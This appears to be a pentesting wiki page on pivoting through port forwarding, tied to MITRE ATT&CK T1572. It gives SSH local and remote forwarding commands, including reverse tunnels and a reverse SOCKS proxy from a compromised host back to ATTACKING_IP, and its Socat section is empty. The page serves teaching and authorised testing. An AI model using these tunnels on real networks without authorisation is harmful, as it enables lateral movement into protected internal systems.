---
description: MITRE ATT&CK™ Protocol Tunneling  - ID T1572 
---
# Port Forwarding

## Theory
Port Forwarding, consist of using any compromised host as a jump box to pivot to other hosts. It is expected that some machines will have more network permissions than others.

## Practice
### SSH tunneling
SSH port forwarding is a mechanism in SSH for tunneling application ports from the client machine to the server machine, or vice versa.  
Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:  

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
{% tabs %}
{% tab title="SSH Local-Forwarding" %}
**Local port forwarding** is used to **forward a port from the client machine to the server machine**. Basically, the SSH client listens for connections on a configured port, and when it receives a connection, it tunnels the connection to an SSH server. The server connects to a configurated destination port, possibly on a different machine than the SSH server.  
  
This example opens a connection to the jump-server.net, and forwards any connection to port 80 on the local machine to port 80 on intra.example.com.
```bash
veresk@kali$ ssh -L *:80:intra.example.com:80 user@jump-server.net -fN
```
{% endtab %}

{% tab title="SSH Remote-Forwarding" %}
**Remote port forwarding** allows a client machine of an SSH connection to redirect one of its ports to a port on the server, or to redirect a port of a network machine from the SSH server to a port local to the server.  
  
We can,for example, on a compromised computer (jump-server) connect back to the attackbox with a reverse port forward using the following command.  
This example produce the same result as previously seen with Local-Forwarding. Any connection on ATTACKING_IP:8000 will be redirected on intra.example.com:80

```bash
PC> ssh -R 8000:intra.example.com:80 tunneluser@ATTACKING_IP -fN
```

In newer versions of the SSH client, it is also possible to create a **reverse proxy** (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it: 
```bash
ssh -R 9090 tunneluser@ATTACKING_IP -fN
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Socat" %}
{% endtab %}
{% endtabs %}
## Resources

{% embed url="https://attack.mitre.org/techniques/T1572/" %}
{% embed url="https://podalirius.net/en/articles/ssh-port-forwarding/" %}


